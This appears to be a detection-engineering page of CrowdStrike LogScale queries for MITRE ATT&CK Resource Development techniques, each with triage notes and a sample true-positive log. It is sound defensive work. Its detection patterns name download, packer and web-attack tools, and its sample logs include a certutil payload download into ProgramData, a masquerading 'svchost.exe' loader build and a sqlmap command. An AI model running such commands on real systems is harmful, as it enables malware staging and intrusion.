# TA0042 - Resource Development

[[00_Master_CQL_Index|← Master CQL Index]]

> Purpose: Atomic CQL/Falcon LogScale detections mapped to MITRE ATT&CK Resource Development. Each technique section includes Obsidian metadata callouts with Dataview-style inline fields and a production-ready CQL block grounded in LogScale pipe/filter/aggregation syntax.

---

### [[T1587]] - Develop Capabilities

> [!metadata]+ Detection Metadata
> tactic:: Resource Development
> technique_id:: T1587
> technique_name:: Develop Capabilities
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Low
> tags:: CQL, MITRE/Resource_Development

* Detection Objective: Detect endpoint activity consistent with payload staging, compilation, or packing in user-writable paths. Enterprise endpoints rarely compile or pack binaries outside developer workstations.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Payload Build or Packing Activity on Endpoint
// Focus: Compiler/packer execution from non-developer paths
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(csc|msbuild|vbc|gcc|clang|go|rustc|pyinstaller|iexpress|upx)\.exe$/i
| CommandLine=/(\/target:exe|\/out:|--onefile|buildmode=pie|upx\s+|iexpress|msbuild.+\.csproj)/i
| NOT ImageFileName=/\\(Program Files|Microsoft Visual Studio|Windows\\Microsoft.NET)/i
| groupBy([aid, ComputerName, UserName, ImageFileName], function=[count(as=exec_count), collect(CommandLine, limit=10)])
| exec_count >= 1
| select([ComputerName, aid, UserName, ImageFileName, exec_count, CommandLine])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Compiler or packer execution, output switches, and execution from user-writable or unusual paths.
* Triage Steps: Confirm whether the host is an approved developer system; collect produced binary paths and hash reputation.
* Potential False Positives: Developer workstations, CI runners, legitimate software packaging.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"csc.exe","CommandLine":"csc.exe /target:exe /out:C:\\Users\\Public\\svchost.exe loader.cs"}
```

---

### [[T1588]] - Obtain Capabilities

> [!metadata]+ Detection Metadata
> tactic:: Resource Development
> technique_id:: T1588
> technique_name:: Obtain Capabilities
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Resource_Development

* Detection Objective: Detect retrieval of offensive tools or payloads via command-line download utilities. The query looks for utility behavior plus suspicious destination file extensions or execution locations.
* Telemetry Requirements: ProcessRollup2, DnsRequest, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Command-Line Retrieval of Offensive Tooling
// Focus: curl/wget/certutil/PowerShell download to executable output
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh|certutil|curl|wget|bitsadmin)\.exe$/i
| CommandLine=/(Invoke-WebRequest|iwr\s|DownloadFile|certutil.+-urlcache|curl\s+(-o|-O)|wget\s+|bitsadmin.+\/transfer)/i
| CommandLine=/(\.exe|\.dll|\.ps1|\.bat|\.vbs|\.js|\\Users\\Public\\|\\ProgramData\\|\\Temp\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Download utility, executable/script extension, and write target in common staging directories.
* Triage Steps: Retrieve downloaded file metadata, command-line URL, and immediate child process execution. Correlate with [[T1105]] and [[T1059]].
* Potential False Positives: Software deployment scripts, helpdesk download actions, package managers.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://example/payload.exe C:\\ProgramData\\payload.exe"}
```

---

### [[T1583]] - Acquire Infrastructure

> [!metadata]+ Detection Metadata
> tactic:: Resource Development
> technique_id:: T1583
> technique_name:: Acquire Infrastructure
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Low
> tags:: CQL, MITRE/Resource_Development

* Detection Objective: Detect command-line use of cloud or DNS tooling to create infrastructure from non-admin endpoints. While not malicious alone, it can identify attacker resource-development activity from a compromised workstation.
* Telemetry Requirements: ProcessRollup2, DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: Cloud or DNS Infrastructure Creation from Endpoint
// Focus: Cloud CLI/DNS tooling creating hosts, buckets, or records
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(aws|az|gcloud|doctl|terraform|pulumi|cloudflare|python|powershell)\.exe$/i
| CommandLine=/(route53|cloudfront|s3api|ec2\s+run-instances|az\s+vm\s+create|gcloud\s+compute|terraform\s+apply|dns\s+record|workers\s+deploy)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Infrastructure-as-code or cloud CLI creation verbs from endpoint context.
* Triage Steps: Validate whether host/user is approved for cloud administration; review credentials and recent authentication.
* Potential False Positives: Cloud engineers and CI/CD workstations.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"aws.exe","CommandLine":"aws ec2 run-instances --image-id ami-123 --user-data file://bootstrap.ps1"}
```

---

### [[T1584]] - Compromise Infrastructure

> [!metadata]+ Detection Metadata
> tactic:: Resource Development
> technique_id:: T1584
> technique_name:: Compromise Infrastructure
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Low
> tags:: CQL, MITRE/Resource_Development

* Detection Objective: Detect use of web exploitation or credential testing tooling that could indicate infrastructure compromise attempts staged from an endpoint.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Infrastructure Compromise Tooling Execution
// Focus: sqlmap/nuclei/ffuf/hydra-style tooling from workstation
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(python|nuclei|sqlmap|ffuf|gobuster|hydra|nmap|curl)\.exe$/i
| CommandLine=/(sqlmap|nuclei|ffuf|gobuster|hydra|wp-login|admin|\.php\?|--data|--proxy|-u\s+https?:\/\/)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Offensive web testing tool names and target URL parameters.
* Triage Steps: Confirm if the activity is sanctioned security testing; review destination ownership and volume.
* Potential False Positives: Red-team, vulnerability management, bug bounty research.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"python.exe","CommandLine":"python sqlmap.py -u https://host/app.php?id=1 --batch"}
```

---

### [[T1587.001]] - Malware

> [!metadata]+ Detection Metadata
> tactic:: Resource Development
> technique_id:: T1587.001
> technique_name:: Malware
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Low
> tags:: CQL, MITRE/Resource_Development

* Detection Objective: Detect local build, packing, or test execution patterns that may indicate malware development or payload preparation on an endpoint.
* Telemetry Requirements: ProcessRollup2, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: Malware Build or Packer Workflow
// Focus: compiler/packer output to suspicious executable names or staging paths
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(csc|msbuild|pyinstaller|go|rustc|upx|iexpress)\.exe$/i
| CommandLine=/(loader|implant|beacon|payload|reverse|shellcode|--onefile|\/target:exe|upx\s+-9|\\Users\\Public\\|\\ProgramData\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Build/packer utilities and payload-oriented output tokens.
* Triage Steps: Confirm whether the host is approved for development or red-team work; collect produced artifacts.
* Potential False Positives: Developer and security testing workstations.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"pyinstaller.exe","CommandLine":"pyinstaller --onefile beacon.py --distpath C:\\Users\\Public"}
```
